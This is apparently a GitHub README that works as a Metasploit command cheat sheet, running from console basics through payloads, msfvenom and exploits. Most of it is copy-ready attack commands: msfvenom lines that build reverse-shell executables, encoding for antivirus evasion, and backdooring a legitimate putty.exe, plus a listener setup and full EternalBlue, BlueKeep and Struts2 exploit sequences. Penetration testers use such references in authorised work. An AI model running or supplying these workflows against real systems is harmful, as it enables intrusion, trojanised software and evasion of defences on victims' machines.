# Metasploit-dictionary
A metasploit dictionary from beginner level the advanced level including most of the important commands to help you as a personal sheet 

> **⚠️ Legal Disclaimer**  
> This guide is for **educational purposes only**. Metasploit is a powerful framework. Unauthorized use of these techniques against systems you do not own or have explicit permission to test is illegal. The author assumes no responsibility for misuse or damage caused by these commands. Know the laws where you live. Use responsibly.


> 📄 **Quick Reference:** [One-page cheat sheet](QUICKREF.md) for the most common Metasploit commands.


## 📖 Table of Contents

1. [Metasploit Fundamentals](#1-metasploit-fundamentals)

2. [Payloads](#2-payloads)

3. [Exploits](#3-exploits)

4. [Auxiliary Modules](#4-auxiliary-modules)

5. [Post-Exploitation (Meterpreter)](#5-post-exploitation-meterpreter)

6. [Database Commands](#6-database-commands)

7. [Encoders and Evasion](#7-encoders-and-evasion)

8. [Handlers and Listeners](#8-handlers-and-listeners)

9. [Resource Scripts](#9-resource-scripts)

10. [Advanced Techniques](#10-advanced-techniques)

11. [Troubleshooting](#11-troubleshooting)



## 1. Metasploit Fundamentals

### Starting and Exiting

| Task | Command |
|------|---------|
| Start Metasploit (console) | `msfconsole` |
| Start Metasploit with a database | `msfconsole -d` |
| Start without loading all modules (faster) | `msfconsole -q` |
| Exit Metasploit | `exit` |

### Core Navigation Commands

| Task | Command |
|------|---------|
| Show all modules (by category) | `show` |
| Show all exploits | `show exploits` |
| Show all payloads | `show payloads` |
| Show all auxiliary modules | `show auxiliary` |
| Show all post-exploitation modules | `show post` |
| Show all encoders | `show encoders` |
| Show all nops | `show nops` |

### Using Modules

| Task | Command |
|------|---------|
| Use a specific module | `use [module/path]` |
| Go back one level (out of current module) | `back` |
| Show information about current module | `info` |
| Show options for current module | `show options` |
| Check if target is vulnerable (without exploiting) | `check` |

### Setting Parameters

| Task | Command |
|------|---------|
| Set a parameter (e.g., RHOSTS, LHOST, LPORT) | `set [PARAMETER] [value]` |
| Set a parameter globally (for all modules) | `setg [PARAMETER] [value]` |
| Unset a specific parameter | `unset [PARAMETER]` |
| Unset all parameters | `unset all` |
| Show your current global variables | `show global` |

### Running Modules

| Task | Command |
|------|---------|
| Execute the current module | `run` |
| Execute the current module (same as run) | `exploit` |
| Execute in the background (as a job) | `run -j` |
| Execute without checking for conflicts | `run -d` |
| Execute with a specific payload | `run payload=[payload/path]` |

### Session Management

| Task | Command |
|------|---------|
| List all active sessions | `sessions` |
| Interact with a specific session | `sessions -i [id]` |
| Stop a specific session | `sessions -k [id]` |
| Stop all sessions | `sessions -K` |
| Run a command on all active sessions | `sessions -c [command]` |
| Background the current session | `background` |

### Job Management

| Task | Command |
|------|---------|
| List all active jobs (exploits running in background) | `jobs` |
| Stop a specific job | `jobs -k [id]` |
| Stop all jobs | `jobs -K` |

### Help and Documentation

| Task | Command |
|------|---------|
| Show general help | `help` |
| Show help for a specific command | `help [command]` |
| Open the Metasploit wiki (within msfconsole) | `help -h` |

### Workspace Management (with database)

| Task | Command |
|------|---------|
| List all workspaces | `workspace` |
| Create or switch to a workspace | `workspace [name]` |
| Delete a workspace | `workspace -d [name]` |
| Rename a workspace | `workspace -r [old] [new]` |

### Database Commands (Quick Look)

| Task | Command |
|------|---------|
| Import an Nmap scan | `db_import [file.xml]` |
| Show hosts discovered | `hosts` |
| Show services discovered | `services` |
| Show credentials found | `creds` |
| Show vulnerabilities found | `vulns` |
| Delete all hosts (clear workspace) | `hosts -d` |

> **Note:** A full database section comes later. This is just enough to get started.

---

## First Steps Workflow (Example)

|Task|Meaning|
|-----|--------|
|msfconsole -d |     start Metasploit with database support|
|workspace target1|        Create a new workspace|
|search eternalblue |      Search for an exploit|
|exploit/windows/smb/ms17_010_eternalblue|            # See what needs to be set|
|set RHOSTS 192.168.1.10 / set LHOST 192.168.1.5|   # Your IP set LPORT 4444|
|check |                  # See if it's vulnerable|
|run |                    # Run the exploit|
|sessions |              # See the session you got back|
|sessions -i 1   |        # Interact with it|
|background   |           # Send session to the background when done|



## 2. Payloads

### Understanding Payloads

A payload is the code that runs on the target system after a successful exploit. Metasploit has three main types:

| Type | Description | When to Use |
|------|-------------|-------------|
| **Staged** | Small stager downloads the rest of the payload | Limited space (buffer overflow, limited memory) |
| **Stageless** | Single, self-contained payload | More reliable, but larger |
| **Inline** | Single payload (same as stageless) | Simpler, no separate download stage |

### Common Payload Naming Convention

| Part | Example | Meaning |
|------|---------|---------|
| OS | `windows/`, `linux/`, `android/` | Target operating system |
| Architecture | `x64/`, `x86/`, `armle/` | CPU architecture |
| Type | `meterpreter/`, `shell/`, `vnc/` | Payload family |
| Protocol | `reverse_tcp`, `bind_tcp`, `reverse_http` | Connection method |

### The Most Useful Payloads

| Payload | Use Case | Notes |
|---------|----------|-------|
| `windows/x64/meterpreter/reverse_tcp` | Standard Windows reverse shell | Most common, stable |
| `windows/meterpreter/reverse_tcp` | Same for 32-bit Windows | Use when target is x86 |
| `linux/x64/meterpreter/reverse_tcp` | Standard Linux reverse shell | Most common for Linux |
| `windows/x64/shell/reverse_tcp` | Simple reverse shell (no Meterpreter) | Smaller, less features |
| `android/meterpreter/reverse_tcp` | Android remote access | Requires APK installation |
| `java/meterpreter/reverse_tcp` | Cross-platform (Java installed) | Works on Windows, Linux, Mac |
| `osx/x64/meterpreter/reverse_tcp` | macOS target | For Mac systems |

### Finding Payloads

| Task | Command |
|------|---------|
| Show all payloads | `show payloads` |
| Search for payloads by keyword | `search name:reverse_tcp` |
| Search for payloads by OS | `search platform:windows` |
| Search for payloads by architecture | `search arch:x64` |
| Filter payloads in current module | `show payloads` (while in an exploit) |

### Setting a Payload

| Task | Command |
|------|---------|
| Set payload for current module | `set payload [payload/path]` |
| Set payload globally | `setg payload [payload/path]` |
| Show payload options after setting | `show options` |

### Required Payload Options

| Parameter | Purpose | Example |
|-----------|---------|---------|
| `LHOST` | Your IP address (listener) | `set LHOST 192.168.1.5` |
| `LPORT` | Your port (listener) | `set LPORT 4444` |
| `RHOST` | Target IP (bind payloads) | `set RHOST 192.168.1.10` |
| `RPORT` | Target port (bind payloads) | `set RPORT 4444` |

### Reverse vs. Bind Payloads

| Method | Direction | Best For |
|--------|-----------|----------|
| **reverse_tcp** | Target connects OUT to you | Most common. Bypasses inbound firewalls |
| **reverse_http** | Target connects out via HTTP | Blends in with web traffic |
| **reverse_https** | Target connects out via HTTPS | Encrypted, harder to detect |
| **bind_tcp** | You connect IN to target | Target has no outbound internet |

### Meterpreter vs. Shell Payloads

| Feature | Meterpreter | Regular Shell |
|---------|-------------|---------------|
| Stealth | High (runs in memory) | Low (creates new process) |
| Commands | Extensive (upload, download, hashdump, etc.) | Basic OS commands |
| Evasion | Built-in | None |
| File Transfer | Built-in | Manual (often unreliable) |
| Best For | Persistent, stealthy access | Quick tasks, limited space |

### Meterpreter Core Commands (Preview)

| Task | Command |
|------|---------|
| List processes | `ps` |
| Move to another process | `migrate [PID]` |
| Get current user privileges | `getuid` |
| Attempt privilege escalation | `getsystem` |
| Kill a process | `kill [PID]` |

(Full Meterpreter section comes later)

### msfvenom: Standalone Payload Generator

You don't need msfconsole to create payloads. `msfvenom` is a separate tool that generates payloads directly.

| Task | Command |
|------|---------|
| List all available payloads | `msfvenom -l payloads` |
| List all encoders | `msfvenom -l encoders` |
| List all output formats | `msfvenom -l formats` |
| Generate a Windows reverse shell EXE | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe` |
| Generate a Linux reverse shell | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf` |
| Generate a PowerShell script | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh-reflection -o payload.ps1` |
| Encoded payload (AV evasion) | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe` |
| Embed payload in legitimate EXE | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/putty.exe -f exe -o putty_backdoor.exe` |

### Multi-Handler: Listening for Payloads

After generating a payload, you need a listener in msfconsole:


msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
run



## 3. Exploits

### What Is an Exploit?

An exploit is a module that delivers a payload to a vulnerable target. It takes advantage of a software or hardware weakness to run code on the target system.

---

### Finding Exploits

**Basic Search Commands**

- Show all exploits: `show exploits`
- Search by CVE number: `search cve:2021`
- Search by name: `search eternalblue`
- Search by platform: `search platform:windows`
- Search by type (remote/local): `search type:remote`
- Search by author: `search author:hdm`
- Search by CVE score: `search cve:2021 cvss:9`

**Search Examples**

| What You Want | Command |
|---------------|---------|
| Windows SMB exploits | `search type:exploit platform:windows name:smb` |
| Remote Linux kernel exploits | `search type:exploit platform:linux name:kernel` |
| EternalBlue | `search eternalblue` |
| Apache exploits | `search apache` |
| MySQL exploits | `search mysql` |

---

### Understanding Search Results

When you search, you'll see results like this example:

`msf6 > search eternalblue`

**Matching Modules**

| Number | Name   |  Rank    | Check|
|--- | ----    | ----    | -----|
|0  |exploit/windows/smb/ms17_010_eternalblue   | average | Yes|
|1  |auxiliary/admin/smb/ms17_010_eternalblue  |    normal  | No|
|2 | exploit/windows/smb/ms17_010_psexec  |         normal  | Yes|

**What each column means:**
- **#** = Index number (use `use 0` to select it)
- **Name** = Full module path
- **Rank** = Reliability (excellent, great, good, normal, average, low, manual)
- **Check** = Whether `check` command works on this module

### Exploit Ranks (From Best to Worst)

Rank Meaning
excellent Works every time, no crashes
great Works reliably, rare crashes
good Works most of the time
normal Works on standard targets
average Often works, sometimes crashes
low Rarely works, often crashes
manual Requires manual configuration

Always choose the highest rank available for your target using an exploit.

## Step-by-step workflow:
- Select an exploit
use exploit/windows/smb/ms17_010_eternalblue

- Show available options
show options

- Set required parameters
set RHOSTS 192.168.1.10
set RPORT 445

- Show available targets (different OS versions)
show targets

- Set specific target if needed
set target 0

- Show payloads that work with this exploit
show payloads

- Set your payload
set payload windows/x64/meterpreter/reverse_tcp

- Set payload options
set LHOST 192.168.1.5
set LPORT 4444

- Test if target is vulnerable (if Check says Yes)
check

- Run the exploit
run

## Useful module commands:

 |Command |Purpose|
|----|----|
 |back| Exit current module without running it|
|info| Show detailed information about the module|
  |show options| Show required and optional parameters|
|show advanced| Show advanced options (timeouts, etc.)|
|show missing| Show only options that are not set|

## Setting Parameters:

|Command |Purpose |Example|
|---|---|-----|
|set [PARAM] [value] |Set a parameter for current module| set RHOSTS 192.168.1.10|
| setg [PARAM] [value] |Set globally (persists across modules)| setg LHOST 192.168.1.5|
|unset [PARAM] |Remove a parameter setting |unset RHOSTS|
|unset all| Remove all parameter |settings unset all|
|Show global| Show all global variables |show global|

Why use global variables? If you're testing multiple exploits on the same target, setg RHOSTS keeps your target IP across all modules. You set it once and forget it.

## Common Exploit Parameters:

|Parameter| Purpose |Typical Value|
|----|----|----|
|RHOSTS| Target IP address or range| 192.168.1.10|
|RPORT |Target port| 445, 80, 443|
|LHOST |Your IP (reverse shell listener)| 192.168.1.5|
|LPORT |Your port (reverse shell listener) |4444|
|SSL |Use SSL/TLS| true or false|
|VERBOSE| Show detailed output| true or false|

## Remote vs. Local Exploits:

|Type |Description| When to Use| Example|
|----|----|----|----|
|Remote exploit| Sent over network to a service |Target has a vulnerable network service| EternalBlue (SMB)|
|Local exploit| Run after you already have a shell |You have low privilege shell, need admin| Windows local privilege escalation|

### Local exploit example:

- After getting a basic shell:
``` bash
use exploit/windows/local/ms16_032_secondary_logon_handle
set SESSION 1
run
```

## Running the Exploit:

|Command| Purpose|
|---|---|
|run| Execute the exploit once|
|exploit| Same as run|
|run -j| Run as background job (keeps console free)|
|run -v| Verbose output (shows everything)|
|run -d |Run without checking for conflicts|

## Job Management (Background Exploits)

- When you use run -j, the exploit runs in the background.

|Command| Purpose|
|---|---|
|jobs| List all running jobs|
|jobs -k [ID] |Kill a specific job|
|jobs -K |Kill all running jobs|

## Check vs. Run

|Command |Purpose| Risk|
|---|---|---|
|check| Tests if target is vulnerable without exploiting| Low risk, no crash|
|run| Actually exploits the target| May crash target|

- Always run check first if the module supports it (Check column says "Yes").

## After Successful Exploitation

-  When an exploit succeeds, you'll see something like:

```bash
[*] Started reverse TCP handler on 192.168.1.5:4444
[*] Sending stage (200774 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.10:49178)
```
### Session management commands:

|Command |Purpose|
|---|----|
|sessions| List all active sessions|
|sessions -i [ID] |Interact with a specific session|
|sessions -k [ID] |Kill a specific session|
|sessions -K| Kill all sessions|
|sessions -c [cmd]| Run command on all sessions|
|background| Send current session to background|


## If the Exploit Fails: Troubleshooting

|Symptom| Likely Cause |Solution|
|----|----|----|
|Exploit completed, but no session| |Payload didn't connect| Check LHOST, LPORT, firewall rules|
|"Connection refused" |Port is closed or filtered| Try different RPORT|
|"Target is not vulnerable" |Patch has been applied| Find a different exploit|
|"Exploit crashed the target" |Target unstable| Choose a different exploit or target type|
|"Timeout"| Network issues or slow target| Increase timeout: set WfsDelay 10|
|"Failed to load module"| Module path wrong| Double-check the path with search|


## Real-World Exploit Example 1: EternalBlue (MS17-010)

- This exploit targets Windows SMB vulnerability from 2017. Still works on unpatched systems.

```bash
msfconsole -q
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
check
run
sessions -i 1
```


## Real-World Exploit Example 2: BlueKeep (RDP)

- This exploits a vulnerability in Remote Desktop Protocol (CVE-2019-0708).

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set LPORT 4444
show targets
set target 7
run
```
- Important: BlueKeep requires the correct target number. Use show targets and match the target to the victim's operating system. Wrong target will crash the target.


  ## Real-World Exploit Example 3: Apache Struts2

- This exploits a remote code execution vulnerability in Apache Struts2 web applications.

```bash
use exploit/multi/http/struts2_rest_xstream
set RHOSTS 192.168.1.10
set RPORT 8080
set TARGETURI /orders
set LHOST 192.168.1.5
set LPORT 4444
run
```


## Summary: The Exploit Workflow

|Step |Code|
|----|----|
|1. Search for exploit  |  → search [keyword]|
|2. Select exploit   |     → use [module/path]|
|3. Show options     |     → show options|
|4. Set parameters    |    → set RHOSTS, set LHOST, etc.|
|5. Show targets     |     → show targets (if needed)|
|6. Show payloads    |     → show payloads|
|7. Set payload       |    → set payload [path]|
|8. Test vulnerability |   → check|
|9. Run exploit     |      → run|
|10. Interact with session| → sessions -i [ID]|


